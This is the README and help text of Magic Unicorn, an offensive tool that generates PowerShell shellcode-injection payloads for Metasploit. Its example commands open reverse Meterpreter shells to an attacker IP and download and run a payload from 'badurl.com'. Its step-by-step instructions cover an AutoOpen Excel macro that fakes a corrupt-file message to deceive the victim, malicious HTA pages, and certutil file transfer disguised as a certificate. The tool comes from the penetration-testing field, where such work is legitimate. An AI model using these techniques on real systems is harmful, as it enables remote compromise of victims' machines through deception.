unicorn
=======

Written by: Dave Kennedy (@HackingDave)
Website: https://www.trustedsec.com

Magic Unicorn is a simple tool for using a PowerShell downgrade attack and inject shellcode straight into memory. Based on Matthew Graeber's powershell attacks and the powershell bypass technique presented by David Kennedy (TrustedSec) and Josh Kelly at Defcon 18.

Usage is simple, just run Magic Unicorn (ensure Metasploit is installed and in the right path) and magic unicorn will automatically generate a powershell command that you need to simply cut and paste the powershell code into a command line window or through a payload delivery system.

root@rel1k:~/Desktop# python unicorn.py 


                                                         ,/
                                                        //
                                                      ,//
                                          ___   /|   |//
                                      `__/\_ --(/|___/-/
                                   \|\_-\___ __-_`- /-/ \.
                                  |\_-___,-\_____--/_)' ) \
                                   \ -_ /     __ \( `( __`\|
                                   `\__|      |\)\ ) /(/|
           ,._____.,            ',--//-|      \  |  '   /
          /     __. \,          / /,---|       \       /
         / /    _. \  \        `/`_/ _,'        |     |
        |  | ( (  \   |      ,/\'__/'/          |     |
        |  \  \`--, `_/_------______/           \(   )/
        | | \  \_. \,                            \___/\
        | |  \_   \  \                                 \
        \ \    \_ \   \   /                             \
         \ \  \._  \__ \_|       |                       \
          \ \___  \      \       |                        \
           \__ \__ \  \_ |       \                         |
           |  \_____ \  ____      |                        |
           | \  \__ ---' .__\     |        |               |
           \  \__ ---   /   )     |        \              /
            \   \____/ / ()(      \          `---_       /|
             \__________/(,--__    \_________.    |    ./ |
               |     \ \  `---_\--,           \   \_,./   |
               |      \  \_ ` \    /`---_______-\   \\    /
                \      \.___,`|   /              \   \\   \
                 \     |  \_ \|   \              (   |:    |
                  \    \      \    |             /  / |    ;
                   \    \      \    \          ( `_'   \  |
                    \.   \      \.   \          `__/   |  |
                      \   \       \.  \                |  |
                       \   \        \  \               (  )
                        \   |        \  |              |  |
                         |  \         \ \              I  `
                         ( __;        ( _;            ('-_';
                         |___\        \___:            \___:
                
-------------------- Magic Unicorn Attack Vector v2.3.3-----------------------------

Native x86 powershell injection attacks on any Windows platform.
Written by: Dave Kennedy at TrustedSec (https://www.trustedsec.com)
Twitter: @TrustedSec, @HackingDave
Credits: Matthew Graeber, Justin Elze, Chris Gates

Happy Magic Unicorns.

Usage: python unicorn.py payload reverse_ipaddr port <optional hta or macro, crt>
PS Example: python unicorn.py windows/meterpreter/reverse_tcp 192.168.1.5 443
PS Down/Exec: python unicorn.py windows/download_exec exe=test.exe url=http://badurl.com/payload.exe
Macro Example: python unicorn.py windows/meterpreter/reverse_tcp 192.168.1.5 443 macro
HTA Example: python unicorn.py windows/meterpreter/reverse_tcp 192.168.1.5 443 hta
CRT Example: python unicorn.py <path_to_payload/exe_encode> crt
Custom PS1 Example: python unicorn.py <path to ps1 file>
Custom PS1 Example: python unicorn.py <path to ps1 file> macro 500
Help Menu: python unicorn.py --help

root@stronghold:/home/relik/Desktop/git/unicorn# python unicorn.py --help

[********************************************************************************************************]

                -----POWERSHELL ATTACK INSTRUCTIONS----

Everything is now generated in two files, powershell_attack.txt and unicorn.rc. The text file contains all
of the code needed in order to inject the powershell attack into memory. Note you will need a place that
supports remote command injection of some sort. Often times this could be through an excel/word  doc or
through psexec_commands inside of Metasploit, SQLi, etc.. There are so many implications and  scenarios to
where you can use this attack at. Simply paste the powershell_attacks.txt command in any command prompt
window or where you have the ability to call the powershell executable and it will give a shell back to
you. This attack also supports windows/download_exec for a payload method instead of just Meterpreter
payloads.

Note that you will need to have a listener enabled in order to capture the attack.

[*******************************************************************************************************]
    

[*******************************************************************************************************]

                -----MACRO ATTACK INSTRUCTIONS----

For the macro attack, you will need to go to File, Properties, Ribbons, and select Developer. Once you do
that, you will have a developer tab. Create a new macro, call it AutoOpen and paste the generated code
into that. This will automatically run. Note that a message will prompt to the user saying that the file
is corrupt and automatically close the excel document. THIS IS NORMAL BEHAVIOR! This is  tricking the
victim to thinking the excel document is corrupted. You should get a shell through powershell injection
after that.

NOTE: WHEN COPYING AND PASTING THE EXCEL, IF THERE ARE ADDITIONAL SPACES THAT ARE ADDED YOU NEED TO
REMOVE THESE AFTER EACH OF THE POWERSHELL CODE SECTIONS UNDER VARIABLE "x" OR A SYNTAX ERROR WILL
HAPPEN!

[*******************************************************************************************************]

    

[*******************************************************************************************************]

                -----HTA ATTACK INSTRUCTIONS----

The HTA attack will automatically generate two files, the first the index.html which tells the browser to
use Launcher.hta which contains the malicious powershell injection code. All files are exported to the
hta_access/ folder and there will be three main files. The first is index.html, second Launcher.hta and the
last, the unicorn.rc file. You can run msfconsole -r unicorn.rc to launch the listener for  Metasploit.

A user must click allow and accept when using the HTA attack in order for the powershell injection to work
properly.

[*******************************************************************************************************]

    

[*******************************************************************************************************]

                -----CERUTIL Attack Instruction----

The certutil attack vector was identified by Matthew Graeber (@mattifestation) which allows you to take
a binary file, move it into a base64 format and use certutil on the victim machine to convert it back to
a binary for you. This should work on virtually any system and allow you to transfer a binary to the victim
machine through a fake certificate file. To use this attack, simply place an executable in the path of
unicorn and run python unicorn.py <exe_name> crt in order to get the base64 output. Once that's finished,
go to decode_attack/ folder which contains the files. The bat file is a command that can be run in a
windows machine to convert it back to a binary.

[*******************************************************************************************************]
    

[*******************************************************************************************************]

                -----Custom PS1 Attack Instructions----

This attack method allows you to convert any PowerShell file (.ps1) into an encoded command or macro.

Note if choosing the macro option, a large ps1 file may exceed the amount of carriage returns allowed by
VBA. You may change the number of characters in each VBA string by passing an integer as a parameter.

Examples:

python unicorn.py harmless.ps1
python unicorn.py myfile.ps1 macro
python unicorn.py muahahaha.ps1 macro 500

The last one will use a 500 character string instead of the default 380, resulting in less carriage returns in VBA.

[*******************************************************************************************************]
    
-------------------- Magic Unicorn Attack Vector v2.3.3-----------------------------

Native x86 powershell injection attacks on any Windows platform.
Written by: Dave Kennedy at TrustedSec (https://www.trustedsec.com)
Twitter: @TrustedSec, @HackingDave
Credits: Matthew Graeber, Justin Elze, Chris Gates

Happy Magic Unicorns.

Usage: python unicorn.py payload reverse_ipaddr port <optional hta or macro, crt>
PS Example: python unicorn.py windows/meterpreter/reverse_tcp 192.168.1.5 443
PS Down/Exec: python unicorn.py windows/download_exec exe=test.exe url=http://badurl.com/payload.exe
Macro Example: python unicorn.py windows/meterpreter/reverse_tcp 192.168.1.5 443 macro
HTA Example: python unicorn.py windows/meterpreter/reverse_tcp 192.168.1.5 443 hta
CRT Example: python unicorn.py <path_to_payload/exe_encode> crt
Custom PS1 Example: python unicorn.py <path to ps1 file>
Custom PS1 Example: python unicorn.py <path to ps1 file> macro 500
Help Menu: python unicorn.py --help

